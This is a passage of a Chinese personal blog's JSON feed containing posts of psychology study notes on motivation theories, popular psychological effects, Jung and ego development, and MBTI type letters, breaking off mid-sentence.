href=\"#一些名词\">#</a> 一些名词</h3>\n<p>某定论：人在全面的认识自己的 “真实需求” 后，没有被完全压抑的那个我。</p>\n<p>偶像包袱：本质就是隐藏真实的自我。为了不让别人发现你真实的样子，你伪装出一种 “完美的自我”。因为你认为别人喜欢的并非真实的自己。所以你会尽量的去扮演那个别人眼中的你。</p>\n<p>完美主义是一种比较复杂的心理问题。它的出发点在于什么事情都得尽量做到主观上的完美。如果不完美，心里就会产生不舒服的情绪。而这种不舒服的根源，就是压抑，压抑了真实的自我。</p>\n<p>对完美的要求越来越高，控制欲，焦虑感也不断生发。时间久了就会产生精神问题。所以很多完美主义者，到了后期，会变得异常敏感，焦虑，睡眠不足。控制欲变得特别强烈。</p>\n<h3 id=\"其他\"><a class=\"markdownIt-Anchor\" href=\"#其他\">#</a> 其他</h3>\n<p>自我就是一些知道与体验的综合体。自我并没有中心，自我是反而更像雾，一堆概念化的东西。因为你的知道与体验都没可能是 100% 的，每次累计下来的，就成了这些形成自我的材料。</p>\n<p>很多人喜欢用批判性思维来成为他的一种固定思维模式。因为有了批评，就会激起了一个中心，而雾就一旦有了中心就会向龙卷风一样运作。或者有些人总要用自己的体验来驳倒他人的体验。</p>\n<p>但是体验的一个决定性因素却是自己完全主导的警觉性。就像你可以让一个人体验一万同样的事情，但你却无法诱发他内心的任何警觉性出来。</p>\n<h2 id=\"动机理论\"><a class=\"markdownIt-Anchor\" href=\"#动机理论\">#</a> “动机” 理论</h2>\n<h2 id=\"本能论\"><a class=\"markdownIt-Anchor\" href=\"#本能论\">#</a> 本能论</h2>\n<p>本能是天生的倾向性，即对某些客体格外敏感，并在主观上伴随着一种特定的情绪。</p>\n<p>是一种有目的的行为，由于学习，本能行为的外界情景的性质会改变，某些行为反应的模式也会调整，但本能的核心情绪却是不可以改变的。</p>\n<p>有什么行为便有什么样的本能与其相应。此理论被认为不过是文字游戏，广泛被抨击。</p>\n<p>斯金纳认为任何活动只要随后紧跟着积极的奖励便得到强化，没有奖励，活动便会消失。</p>\n<h2 id=\"精神分析学说\"><a class=\"markdownIt-Anchor\" href=\"#精神分析学说\">#</a> 精神分析学说</h2>\n<p>弗洛伊德认为人有两大类本能：一种是生存本能，如饮食和性等；另一种是死亡本能，如残暴和自杀等。</p>\n<p>这两种本能在现实生活中都不能自由发展，而常常会受到压抑。这些被压抑下去的无意识冲动在梦、失言和笔误等以及许多神经症状中会显露出来，在日常生活中也会以升华或其他文饰的方式出现。</p>\n<p>弗洛伊德用本我、自我和超我 3 个层次来解释心理的动力关系。他的无意识动机从强调本能转移到了注意社会因素的影响。</p>\n<h2 id=\"驱力学说\"><a class=\"markdownIt-Anchor\" href=\"#驱力学说\">#</a> 驱力学说</h2>\n<p>赫尔认为机体的需要产生驱力，驱力迫使机体活动，但引起哪种活动或反应，要依环境中的对象来决定。</p>\n<p>只要驱力状态存在，外部的适当刺激就会引起一定的反应。这种反应与刺激之间的连结是与生俱来的。</p>\n<p>如果反应减弱了驱力的紧张状态，那么，反应与刺激之间的连结就会和条件反射的机制一样得到加强。由于多次加强的累积作用，习惯本身也获得了驱力。</p>\n<h2 id=\"本能发展\"><a class=\"markdownIt-Anchor\" href=\"#本能发展\">#</a> 本能发展</h2>\n<p>弗洛伊德把 “里比多” 的发展分为口唇期、肛门期和生殖器期。在某一发展阶段，对本能的过分放纵或使本能受到剥夺而得不到满足，都会使其停滞在该阶段。</p>\n<p>满足需要的行为可以是本能的，也可以是对某一特殊对象习得的定向。如果没有特殊指向性的目标，行为就是随机的，只有当找到适当的符号刺激时，行为才会有固定的模式。</p>\n<p>行为随环境的要求而改变。如果环境中出现两个矛盾的符号刺激，那末，固定的行为模式就会改变。</p>\n<p>在关键期的敏感阶段，如果用不寻常的符号刺激来代替本能的刺激，那末，前者也能取代后者成为强烈的激发对象。</p>\n<h2 id=\"认知的动机理论\"><a class=\"markdownIt-Anchor\" href=\"#认知的动机理论\">#</a> 认知的动机理论</h2>\n<p>行为的动机是指望得到某些东西，或者企图躲避某些讨厌的事物。凭借经验，我们还期望通过某些途径或手段来达到我们行动的目的。</p>\n<p>达到目的的活动可以采取多种形式，有许多不同的途径，但一个人为什么采取这一条而不选取另一条？这就要追究他是怎样看待事物的因果关系了。</p>\n<p>洛克认为目标是动机的决定力量，要高标准才有最高的成就。不过这个目标一定要是自觉提出的，而且要求具体。</p>\n<p>一般人的因果观念来自对复杂现象简单化、笼统化的常识理解。例如一个人工作成功了，他可以归因于自己的努力或能力，失败了则归因于环境的条件或他人的过错。</p>\n<p>费斯廷格把认知失调作为一种动力，认为它迫使人们改变态度以换取认知的平衡。狐狸望着甜葡萄发馋，可是高不可攀，便说葡萄是酸的，以此来安慰自己。</p>\n<p>对动机的原动力或机制的解释</p>\n<p>许多人都承认需要和现成的满足需要的手段的差距是心理的内因。活动与需要之间的关系是辩证的，为满足需要就要进行活动，满足需要的活动又会产生新的需要。</p>\n<p>人的生理需要和心理的或社会的需要是难以完全分开的。需要也是发展的，在满足原始的需要后，又会产生新的需要，这是永无止境的。</p>\n<p>需要就不是固定的、天赋的，许多社会动机也就必然是后天获得的。</p>\n<p>在特定的社会里，生产力和生产关系的基本模式决定着动机的基本模式。满足需要的手段更是如此，即使是最基本的需要，在不同的社会里也有不同的满足手段。</p>\n<h2 id=\"马斯洛-动机解释\"><a class=\"markdownIt-Anchor\" href=\"#马斯洛-动机解释\">#</a> 马斯洛 “动机解释”</h2>\n<p>动机是驱使人从事各种活动的内部原因。有外部动机和内部动机之分。外部动机指的是个体在外界的要求或压力的作用下所产生的动机，内部动机则是指由个体的内在需要所引起的动机。</p>\n<p>动机的研究在某种程度上必须是人类的终极目的、欲望或需要的研究。普通欲望有干百种，但它们通常是达到目的的手段而非目的本身。人类真正渴望满足的一些基本目标或需求的数目是有限的。</p>\n<p>人类满足各种需求的方式虽有极大的文化差异，但人类所追求的基本或终极目标都是相当一致的。应透过文化的差异去研究人类共同追求的基本目标或需要。</p>\n<p>性行为与有意识的性欲并不仅仅是对性满足的追求，其无意识的目的可能是极为复杂的。性欲可能代表了对自信欲望的索取，吸引注意力的欲望，或者对于亲密感、友谊、安全、爱的欲望，或者这些欲望的任何一种组合。</p>\n<p>个体遭受拒绝的感受，必然会影响他的身心组织，使他感到紧张或不快乐。这种状态还会转而导致其他事件的发生，例如采取种种自我防卫方式、压抑敌意等。动机是连续不断的、无休止的、起伏的，也是复杂的。</p>\n<p>人类从不会感到满足。人是一种不断追求的动物，当他的一个欲望满足后，另一个会迅速出现并取代它的位置；当这个欲望被满足了，又会有一个站到突出位置上来；</p>\n<p>动机的出现实际上总是取决于整个有机体所可能具有的其他所有动机的满足或非满足状态，即取决于这样或那样的优势欲望已经达到相对满足的状态。</p>\n<p>当我们沿这种系阶梯上升，我们所理解的本能有逐步消失的倾向，对作为适应工具的文化的依赖将越来越大。口味变得越来越重要，饥饿变得越来越不重要。</p>\n<p>成熟、表现、成长以及自我实现等现象皆是自然流露的表现性行为而非对环境的应付性行为，因而可以看作无动机的或超动机的行为。</p>\n<h3 id=\"需要与动机\"><a class=\"markdownIt-Anchor\" href=\"#需要与动机\">#</a> 需要与动机</h3>\n<p>生理需要、安全需要、相属与相爱需要、受人尊重的需要、自我实现的需要。</p>\n",
            "tags": [
                "MBTI"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/%E5%BF%83%E7%90%86%E5%AD%A6%E5%90%8D%E8%AF%8D/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/%E5%BF%83%E7%90%86%E5%AD%A6%E5%90%8D%E8%AF%8D/",
            "title": "心理学名词",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>心理学符号在希腊语里是灵魂的意思。</p>\n<h3 id=\"潜意识\"><a class=\"markdownIt-Anchor\" href=\"#潜意识\">#</a> 潜意识</h3>\n<p>在人类心理活动中，不能认知或没有认知到的部分</p>\n<p>人类其实和动物一样，心里充满了野蛮的、兽性的、肮脏的想法。这些想法就存储在潜意识当中。</p>\n<p>意识是我们心理世界被探照灯照亮的地方，是我们能感知的地方，而心灵的黑暗处，就是潜意识。</p>\n<p>现代心理学认为，很大程度上我们的潜意识中性</p>\n<h3 id=\"本我自我超我\"><a class=\"markdownIt-Anchor\" href=\"#本我自我超我\">#</a> 本我自我超我</h3>\n<p>本我：即本能，由各种欲望组成</p>\n<p>超我：代表着道德约束、社会规范</p>\n<p>自我：随时随地解决本我和超我的冲突</p>\n<h3 id=\"强迫性重复\"><a class=\"markdownIt-Anchor\" href=\"#强迫性重复\">#</a> 强迫性重复</h3>\n<p>人们会主动地追求重复一些情景，不断地去体验其中的一些感受。</p>\n<p>孩子在经历了一件痛苦的事情之后，会不自觉地制造同样的情景，去体验同样的情感。</p>\n<p>在我们成年后，我们的大脑还在帮助我们修复童年的创伤，这种修复过程是无意识的。我们很容易被某个类型的人吸引，因为这些人身上有我们成长中重要人物的心理特征。</p>\n<p>我们没有意识到发生了什么，只是一次又一次进入重复模式。</p>\n<h3 id=\"罗森塔尔效应\"><a class=\"markdownIt-Anchor\" href=\"#罗森塔尔效应\">#</a> 罗森塔尔效应</h3>\n<p>也称为 “皮格马利翁效应”，是一种社会心理效应，即权威（有权利、有威望、有资源）的期待。</p>\n<p>权威们将 “你有潜力” 或 “你没有潜力” 的预言传递到学生身上，最终强有力地影响了那些学生。</p>\n<h3 id=\"习得性无助\"><a class=\"markdownIt-Anchor\" href=\"#习得性无助\">#</a> 习得性无助</h3>\n<p>塞利格曼起初把狗关在笼子里，只要蜂音器一响就给予电击。多次实验后，还没等到电击，蜂音器开始响起时狗就趴在地上呻吟颤抖。</p>\n<p>本来可以逃避却绝望地等待痛苦来临，这就是习得性无助。</p>\n<p>表现在人身上，一个人在某件事上付出多次努力，却反复失败，他就会在这件事情上放弃努力，并将这无助的感觉泛化到新的情景当中，哪怕那些情境可以控制。</p>\n<h3 id=\"心理舒适区\"><a class=\"markdownIt-Anchor\" href=\"#心理舒适区\">#</a> 心理舒适区</h3>\n<p>人为构想出来的一个让你保持安全感和免受不舒服感觉的边界，就是让你觉得放松，没有压力，并且不会引起 你焦虑的心理边界。</p>\n<p>最常见的舒适区比如我们熟悉待的地方，习惯扮演的角色，习惯相处的人，习惯做的事情等等。</p>\n<p>而当我们的行为超出了心理舒适区，我们就会感到不安全，焦虑甚至恐惧。</p>\n<p>我们接受工作上的新任务，交往新的人际关系就是在突破我们的舒适区。一开始会感到不舒服，但新的行为达成之后，会有一个非常关键的变化 —— 我们的 “舒适区” 扩大了。</p>\n<p>成长的过程，就是舒适区不断扩大的过程。</p>\n<h3 id=\"聚光灯效应\"><a class=\"markdownIt-Anchor\" href=\"#聚光灯效应\">#</a> 聚光灯效应</h3>\n<p>又叫焦点效应，我们总是不经意地把自己的问题放到无限大，当我们出丑时总以为人家会注意到，其实人家或许当时会注意，但事后马上就忘了。</p>\n<p>实验表明，人们会认为有超过 50% 的人注意到自己，但实际上，只有不到 20% 的人有兴趣往你身上看一眼。</p>\n<p>无论你走在哪里，你都会认为聚光灯永远打在你身上。</p>\n<h3 id=\"禀赋效应\"><a class=\"markdownIt-Anchor\" href=\"#禀赋效应\">#</a> 禀赋效应</h3>\n<p>当你拥有一件物品之后，你对这个物品价值的评价会比你没有拥有它时更高。</p>\n<p>相对于获得，人们非常不乐意放弃已经属于他们的东西。禀赋效应简单点说，就是因为拥有而喜欢。</p>\n<h3 id=\"约拿情结\"><a class=\"markdownIt-Anchor\" href=\"#约拿情结\">#</a> 约拿情结</h3>\n<p>在机遇面前自我逃避，畏缩后退的心理。是出于对自尊的过度保护，而产生的对成长的恐惧和更高追求的回避。</p>\n<p>约拿是圣经旧约中的一个人物，他一直渴望得到上帝的差遣，去成就一番伟大的事业。终于上帝给了他一个光荣的任务 ­—— 去宣布赦免一座本来要被罪行毁灭的城市。但是约拿却逃跑了。</p>\n<p>当你面临一个挑战的时候，你的第一个反应是我要想方设法完成它，还是去怀疑自己，担心做不成这件事，担心别人对你的评价或你对自己的评价降低？如果你常常在怀疑自己，你就可能陷入了 “约拿情结”。</p>\n<h3 id=\"具身认知\"><a class=\"markdownIt-Anchor\" href=\"#具身认知\">#</a> 具身认知</h3>\n<p>人的心理状态会被人的生理体验塑造，二者之间有强烈的联系。</p>\n<p>用生理体验来激活心理感觉。</p>\n<h3 id=\"鸟笼逻辑\"><a class=\"markdownIt-Anchor\" href=\"#鸟笼逻辑\">#</a> 鸟笼逻辑</h3>\n<p>挂一个漂亮的鸟笼在房间里最显眼的地方，过不了几天，主人一定会做出下面两个选择之一：把鸟笼扔掉，或者买一只鸟回来放在鸟笼里。</p>\n<p>人们绝大部分的时候是采取惯性思维。所以可见在生活和工作中培养逻辑思维是多么重要。</p>\n<h3 id=\"破窗效应\"><a class=\"markdownIt-Anchor\" href=\"#破窗效应\">#</a> 破窗效应</h3>\n<p>一个房子如果窗户破了，没有人去修补，隔不久，其它的窗户也会莫名其妙的被人打破</p>\n<p>一面墙，如果出现一些涂鸦没有清洗掉，很快的，墙上就布满了乱七八糟，不堪入目的东西</p>\n<p>一个很干净的地方，人会不好意思丢垃圾，但是一旦地上有垃圾出现之后，人就会毫不犹疑的拋，丝毫不觉羞愧</p>\n<p>任何坏事，如果在开始时没有阻拦掉，形成风气，改也改不掉，就好象河堤，一个小缺口没有及时修补，可以崩坝，造成千百万倍的损失。</p>\n<h3 id=\"巴纳姆效应\"><a class=\"markdownIt-Anchor\" href=\"#巴纳姆效应\">#</a> 巴纳姆效应</h3>\n<p>人很容易相信一个笼统的、一般性的人格描述特别适合他。</p>\n<p>即使这种描述十分空洞，他仍然认为反映了自己的人格面貌。</p>\n<p>责任分散效应</p>\n<p>当一个人遇到紧急情境时，如果只有他一个人能提供帮助，他会清醒地意识到自己的责任，对受难者给予帮助。如果他见死不救会产生罪恶感、内疚感，这需要付出很高的心理代价。</p>\n<p>而如果有许多人在场的话，帮助求助者的责任就由大家来分担，造成责任分散，每个人分担的责任很少，旁观者甚至可能连他自己的那一份责任也意识不到。</p>\n<h3 id=\"帕金森定律\"><a class=\"markdownIt-Anchor\" href=\"#帕金森定律\">#</a> 帕金森定律</h3>\n<p>一个不称职的官员，可能有三条出路，第一是申请退职，把位子让给能干的人；第二是让一位能干的人来协助自己工作；第三是任用两个水平比自己更低的人当助手。</p>\n<p>第一条路是万万走不得的，因为那样会丧失许多权利；第二条路也不能走，因为那个能干的人会成为自己的对手；看来只有第三条路最适宜。</p>\n<p>于是，两个平庸的助手分担了他的工作，他自己则高高在上发号施令，他们不会对自己的权利构成威胁。会形成了一个机构臃肿，人浮于事，相互扯皮，效率低下的领导体系。</p>\n<h3 id=\"晕轮效应\"><a class=\"markdownIt-Anchor\" href=\"#晕轮效应\">#</a> 晕轮效应</h3>\n<p>在人际交往中，人身上表现出的某一方面的特征，掩盖了其他特征，从而造成人际认知的障碍</p>\n<p>&quot;晕轮效应&quot; 往往在悄悄地影响着我们对别人的认知和评价。比如有的老年人对青年人的个别缺点，或衣着打扮、生活习惯看不顺眼，就认为他们一定没出息。</p>\n<p>有的青年人由于倾慕朋友的某一可爱之处，就会把他看得处处可爱，真所谓 &quot;一俊遮百丑&quot;。</p>\n<h3 id=\"霍桑效应\"><a class=\"markdownIt-Anchor\" href=\"#霍桑效应\">#</a> 霍桑效应</h3>\n<p>当同学或自己受到公众的关注或注视时，学习和交往的效率就会大大增加</p>\n<h3 id=\"虚假同感偏差\"><a class=\"markdownIt-Anchor\" href=\"#虚假同感偏差\">#</a> 虚假同感偏差</h3>\n<p>我们通常都会相信，我们的爱好与大多数人是一样的。</p>\n<p>如果你喜欢玩电脑游戏，那么就有可能高估喜欢电脑游戏的人数。</p>\n<p>一种高估与你的行为及态度有相同特点的人数的倾向性。</p>\n<p>对方并非如我们所想象，只有尝试了才会知道。</p>\n<h3 id=\"手表定律\"><a class=\"markdownIt-Anchor\" href=\"#手表定律\">#</a> 手表定律</h3>\n<p>一个人有一只表时，可以知道现在是几点钟，当他同时拥有两只表时，却无法确定。两只手表并不能告诉一个人更准确的时间，反而会让看表的人失去对准确时间的信心。</p>\n<p>对于任何一件事情，不能同时设置两个不同的目标，否则将使这件事情无法完成；</p>\n<p>对于一个人，也不能同时选择两种不同的价值观，否则，他的行为将陷于混乱。</p>\n<p>而对于一个企业，更是不能同时采用两种不同的管理方法，否则将使这个企业无法发展。</p>\n<h3 id=\"不值得定律\"><a class=\"markdownIt-Anchor\" href=\"#不值得定律\">#</a> 不值得定律</h3>\n<p>不值得做的事情，就不值得做好</p>\n<p>一个人如果从事的是一份自认为不值得做的事情，往往会保持冷嘲热讽，敷衍了事的态度。不仅成功率小，而且即使成功，也不会觉得有多大的成就感。</p>\n<h3 id=\"青蛙效应\"><a class=\"markdownIt-Anchor\" href=\"#青蛙效应\">#</a> 青蛙效应</h3>\n<p>把一只青蛙扔进滚沸的油锅，在这生死关头，青蛙竟奋力跃出锅外，侥幸逃生。</p>\n<p>过了一会儿，将这只青蛙再次放入锅中，不过锅中盛的是凉水，青蛙游得自由逍遥。悄悄加热，使水温慢慢升高，青蛙最后难以忍受，但它不能再跃出，只好葬身釜底。</p>\n<h3 id=\"羊群效应\"><a class=\"markdownIt-Anchor\" href=\"#羊群效应\">#</a> 羊群效应</h3>\n<p>出现一般在一个竞争非常激烈的行业上，而且这个行业上有一个领先者占据了主要的注意力，那么整个羊群就会不断摹仿这个领头羊的一举一动，领头羊到哪里去吃草，其它的羊也去哪里淘金。</p>\n<p>哲学家认为是人类理性的有限性，心理学家认为是人类的从众心理，社会学家认为是人类的集体无意识，而经济学家则从信息不完全、委托代理等角度来解释羊群行为。</p>\n<h3 id=\"贝勃规律\"><a class=\"markdownIt-Anchor\" href=\"#贝勃规律\">#</a> 贝勃规律</h3>\n<p>人们对报纸售价涨了 50 元或汽车票由 200 元涨到 250 元会十分敏感，但如果房价涨了 100 甚至 200 元，人们都不会觉得涨幅很大。</p>\n<p>人们一开始受到的刺激越强，对以后的刺激也就越迟钝。</p>\n<h3 id=\"皮革马利翁效应\"><a class=\"markdownIt-Anchor\" href=\"#皮革马利翁效应\">#</a> 皮革马利翁效应</h3>\n<p>期待是一种力量，这种期待的力量就被心理学家称为皮革马利翁效应，也称 &quot;期望效应&quot;。</p>\n<p>“说你行，你就行；说你不行，你就不行”。要想使一个人发展更好，就应该给他传递积极的期望。</p>\n<h3 id=\"污水效应\"><a class=\"markdownIt-Anchor\" href=\"#污水效应\">#</a> 污水效应</h3>\n<p>如果你把一汤匙的酒倒进一桶污水里，你得到的是一桶污水；如果你把一汤匙污水倒进一桶酒里，你得到的还是一桶污水。</p>\n<p>污水和酒的比例并不能决定这桶东西的性质，真正起决定作用的就是那一勺污水，只要有它，再多的酒都成了污水。</p>\n<h3 id=\"思维定势效应\"><a class=\"markdownIt-Anchor\" href=\"#思维定势效应\">#</a> 思维定势效应</h3>\n<p>人的知识和经验多，会在头脑中形成较多的思维定势。</p>\n<p>这种思维定势会束缚人的思维，使思维按照固有的路径展开。</p>\n<h3 id=\"从众效应\"><a class=\"markdownIt-Anchor\" href=\"#从众效应\">#</a> 从众效应</h3>\n<p>周围环境对人的主观意识起到了很大的影响作用，从而使被试做了从众判断。</p>\n<p>从众是个人适应生存的必要方式，可以帮助一个人很快地适应一个陌生的环境，使人迅速地融入一个新的团体中，但从众容易使个人放弃自己的想法。</p>\n<p>压力是从众的另一个决定因素。“木秀于林，风必摧之”，在一个团体内，谁作出与众不同的行为，往往会招致 “背判” 的嫌疑，会被其他成员孤立。</p>\n<p>一个人干得太多，就等于冒犯了众人；但干得太少，又有 “磨洋工” 的嫌疑。为了免遭嫌弃，人们就会采取 “随大流” 的做法。</p>\n",
            "tags": [
                "MBTI"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/%E8%8D%A3%E6%A0%BC%E4%B8%8E%E5%BF%83%E7%90%86%E5%AD%A6/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/%E8%8D%A3%E6%A0%BC%E4%B8%8E%E5%BF%83%E7%90%86%E5%AD%A6/",
            "title": "荣格与心理学",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>真正的成熟是，不去渴望，亦不去定义成熟，却知道自己一直走在「更成熟」的路上。</p>\n<h2 id=\"学习心理学的原因\"><a class=\"markdownIt-Anchor\" href=\"#学习心理学的原因\">#</a> 学习心理学的原因</h2>\n<p>心理学研究的根本目的就是帮助人更加的健康，就是相信人的性格是可以改善的，人的心态是可以提升的。这是所有心理学家付出毕生的精力研究心理学的信念所在。</p>\n<p>心理学为了帮助人成为更好的自己，而不是固化人，用僵化的思维去束缚人。真正的心理学大师都不是在玩 MBTI 九型这些东西，而是通过科学的方法研究人的成长，强调人的成长性。</p>\n<p>优秀的人具有充沛的精力，良好的道德丰富的创造力，强烈的自律的精神和道德追求，他们是如何成为这么好的自己的？把这些人的人格特质和成长规律分析出来，然后其它人再去学习，这就是人格的学习。</p>\n<p>在骗子和蠢货的观念里，人格是没有成长的可能性，你现在是什么样你这一辈子就什么样。将这种固化的思维传递给对方。这无疑是非常可恶的。</p>\n<p>请牢记：重要的不是你现在是什么样的人，重要的是你想成为怎么样的人。</p>\n<h2 id=\"成熟而健全的人格\"><a class=\"markdownIt-Anchor\" href=\"#成熟而健全的人格\">#</a> 成熟而健全的人格</h2>\n<p>荣格十六型人格不是要把人明确的划分区别，而是引导人们建立更健全的人格。</p>\n<p>成熟是从混乱中觉醒，把自己的优势发挥到最强。</p>\n<p>学生时代一直都是自我认知模糊，容易受外界和周围人干扰，尤其容易改变自己、强迫自己来适应环境。成熟后容易认清自己是什么样的人，更能接受本来的自我。</p>\n<p>走向成熟的道路或许艰难，但成熟而幸福的人，能够体会到简单的人生模式下无法体会到的人间百味、感悟更多的关于世间的真谛。谁能说这样的人生不值得一过呢？</p>\n<p>了解自己。了解自己的欲望，了解自己的局限。理解别人，理解别人的欲望，理解别人的局限。可以责怪的人越来越少，人人都有他的难处。</p>\n<p>永远保持热情，永远渴望一切。永不止步，只是不把希望寄托在结果而是过程而已。</p>\n<p>人格并无好坏之分。人格与品行无关。</p>\n<p>每种性格独特的优势，只有在人格充分发展后才能得以完美发挥。从幼稚走向成熟，由性格原型走向人格全面发展，这都是必然的。</p>\n<p>人的心理世界极其复杂，不能知道了一个心理学概念就往所有情况上套，也就是 “拿着锤子，看什么都是钉子”。不断学习才是成长的唯一方法。</p>\n<p>值得注意的是，不可以用测量结果来衡量测量者。应当从测量者中寻求合适的测量结果。切勿本末倒置。</p>\n<h2 id=\"自我发展水平阶段\"><a class=\"markdownIt-Anchor\" href=\"#自我发展水平阶段\">#</a> 自我发展水平阶段</h2>\n<h3 id=\"小孩子从完全被冲动主导\"><a class=\"markdownIt-Anchor\" href=\"#小孩子从完全被冲动主导\">#</a> 小孩子从完全被冲动主导</h3>\n<p>饿了要吃，不给吃就哭</p>\n<h3 id=\"逐渐学会控制自己的冲动\"><a class=\"markdownIt-Anchor\" href=\"#逐渐学会控制自己的冲动\">#</a> 逐渐学会控制自己的冲动</h3>\n<h3 id=\"趋利避害\"><a class=\"markdownIt-Anchor\" href=\"#趋利避害\">#</a> 趋利避害</h3>\n<p>哪个大人给我糖吃，我就听谁的</p>\n<h3 id=\"遵奉阶段\"><a class=\"markdownIt-Anchor\" href=\"#遵奉阶段\">#</a> 遵奉阶段</h3>\n<p>一切遵循社会规范；有绝对化的 “是非对错” 的概念，思维方式刻板、单一。</p>\n<p>比如 “我爸妈说的一切都是对的，和他们唱反调的都是坏人”</p>\n<h3 id=\"自我觉察期\"><a class=\"markdownIt-Anchor\" href=\"#自我觉察期\">#</a> 自我觉察期</h3>\n<p>产生基本的自我觉察，思考也更多元化</p>\n<p>仍受到社会规范、父母或同伴的强烈影响，但同时开始反思 Ta 们说的是否一定正确。</p>\n<h3 id=\"公正阶段\"><a class=\"markdownIt-Anchor\" href=\"#公正阶段\">#</a> 公正阶段</h3>\n<p>主动建立起自己的标准、规则，一旦违反会产生罪恶感</p>\n<p>开始为自己的人生选择负责，希望获得社会认可的成就</p>\n<h3 id=\"个人主义期\"><a class=\"markdownIt-Anchor\" href=\"#个人主义期\">#</a> 个人主义期</h3>\n<p>这一阶段也是由公正阶段向自主阶段的过渡。</p>\n<p>越来越意识到自己的个性，但同时也重视关系，在情感上依赖他人</p>\n<p>自己、对他人都开始变得宽容，容许异议、容许似是而非；“我要我觉得，但我也尊重你觉得”</p>\n<p>对内在冲突开始有所觉察，但尚没有能力解决。</p>\n<p>比如，是独立还是依赖？是追求成就还是接纳当下的自己？</p>\n<h3 id=\"自主阶段\"><a class=\"markdownIt-Anchor\" href=\"#自主阶段\">#</a> 自主阶段</h3>\n<p>不再为道德规则而活，不再一味追求成就，而是走向自我实现</p>\n<p>尊重自己和他人的独立性，甚至意识到独立本身是有局限的</p>\n<p>情感依赖不一定是独立的对立面，在独立的同时，关系让我们更好地支持彼此</p>\n<p>认识到内、外在的冲突原本就是生活的一部分，能够接纳和应对。</p>\n<h3 id=\"整合阶段\"><a class=\"markdownIt-Anchor\" href=\"#整合阶段\">#</a> 整合阶段</h3>\n<p>自我显现出智慧；对自己和他人具备更广泛的同理心；</p>\n<p>与自己的命运达成和解；能够调和内在的冲突，与世间种种 “无解”、“求不得” 和平相处。</p>\n<h2 id=\"成熟方法\"><a class=\"markdownIt-Anchor\" href=\"#成熟方法\">#</a> 成熟方法</h2>\n<h3 id=\"分类\"><a class=\"markdownIt-Anchor\" href=\"#分类\">#</a> 分类</h3>\n<p>人的心智的成熟过程，可以简单归纳成吸收和调整两大步骤。</p>\n<p>吸收：当所发生的事情，符合我们既有的、对世界和自我的理解时，我们感到舒服、顺利。这时这个经历就被吸收到我们既有的认识框架中去了。</p>\n<p>调整：但有时，我们的经历会超越我们既往的认识框架，遇到了难以理解的经历。这时人们就需要调整自己的认知体系，从而能够解释新的经历。</p>\n<h3 id=\"调整\"><a class=\"markdownIt-Anchor\" href=\"#调整\">#</a> 调整</h3>\n<p>在调整后，我们的生活再一次变得可以让自己理解。调整看起来很容易，在现实生活中，却往往是一个充满挣扎的艰苦的过程。</p>\n<p>调整自己原有的对自我和世界的认识体系、使其能够容纳和解释新的遭遇，是非常困难的。</p>\n<p>在调整成功之前，人们往往要沉浸在 “为什么这一切会发生” 的内心痛苦中。</p>\n<h3 id=\"原因\"><a class=\"markdownIt-Anchor\" href=\"#原因\">#</a> 原因</h3>\n<p>人的自我只有在环境不符合他们的预期时，才有成长发展的机会。</p>\n<p>某种程度上，只有当负面的生活经历发生时，我们的自我才有进化地更为成熟的机会和可能。</p>\n<p>正是这些充满挑战的人生经历，拓宽了我们的世界观、加深了我们对自我的认知，从而使我们成为更复杂、更成熟、更有能力应对世事变迁的人。</p>\n<p>但这种成熟发生的前提，是直面负面的经历、是拥抱不确定、是努力理解和消化痛苦的感受。</p>\n<p>如果对负面的经历和感受采取逃避和否认的策略，自我的成熟便不会发生。</p>\n<h3 id=\"自我对话\"><a class=\"markdownIt-Anchor\" href=\"#自我对话\">#</a> 自我对话</h3>\n<p>a）这件事为你带来了哪些改变？你获得了哪些新的经验？</p>\n<p>b）经历了这件事，你看待自我、他人和世界的角度有了哪些变化？</p>\n<p>c）你是如何应对这件事的？你认为自己应对得怎么样？对于自己的应对你有哪些反思？</p>\n<p>d) 你从中获得了什么？</p>\n",
            "tags": [
                "MBTI"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/%E9%83%A8%E5%88%86%E5%AD%97%E6%AF%8D%E7%89%B9%E5%BE%81/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/%E9%83%A8%E5%88%86%E5%AD%97%E6%AF%8D%E7%89%B9%E5%BE%81/",
            "title": "部分字母特征",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>在视野风格上，SJ 是恪守传统的过去主义者，NF 和 NT 是追逐机会成本的未来主义者，SP 是关注此时此刻的现实主义者；而 estp 是现实主义者中的现实主义者，他们是所有类型人中最现实主义导向的类型。</p>\n<h2 id=\"组合字母含义\"><a class=\"markdownIt-Anchor\" href=\"#组合字母含义\">#</a> 组合字母含义</h2>\n<p>NF 都对人性敏感，都本能地关注人性的成长和人生的发展问题，但四种 NF 对这些问题的态度不同。</p>\n<p>ENFP 会去关注人生的各种有趣的可能性，INFP 则会不断地追问人生的意义，但 P 型的 NF 都不太喜欢所谓的 “正确答案”，因为正确答案就意味着封闭，意味着有定论后就不需要再讨论了。</p>\n<p>ENFJ 和 INFJ 会倾向于认为各种人生大问题都是有 “正确答案” 的，他们会找到所谓的 “正确答案” 作为自己的信念或者说信仰。</p>\n<p>NT 都对系统敏感，而根据系统论的观点，一个系统主要可以从功能和结构两方面去分析，当然功能和结构这两个东西是相互联系的，也是不可分割的。</p>\n<p>ENTJ 和 INTJ 相对来说更关注系统的功能方面，也就是如何利用系统去实现一个外部的目的，而 ENTP 和 INTP 则相对来说更关注系统的结构。</p>\n<p>ENTJ 和 INTJ 虽然也会经常去改进和优化系统，但他们的这种改进和优化绝大多数时候都是为了一个外部的目的服务的，也就是战略规划，而 ENTP 则是把系统的优化和改进作为关注的中心。</p>\n<p>ENTJ 作为 NT 中最强势的类型，希望整个系统按照自己认为正确地方式演化并加以运作，因此他们就非常擅长战略思考和全局思维，属于非常有远见的一种类型，可以说是高瞻远瞩。</p>\n<p>ESTJ 和 ENTJ 都很强势，而且都很喜欢命令别人，所以这两种类型粗看起来会很像。ESTJ 的特征功能更接近管理，而 ENTJ 的特征功能更接近领导。</p>\n<p>管理就是低头赶车，领导就是抬头看路。ESTJ 的命令会带有更多的监管色彩、ENTJ 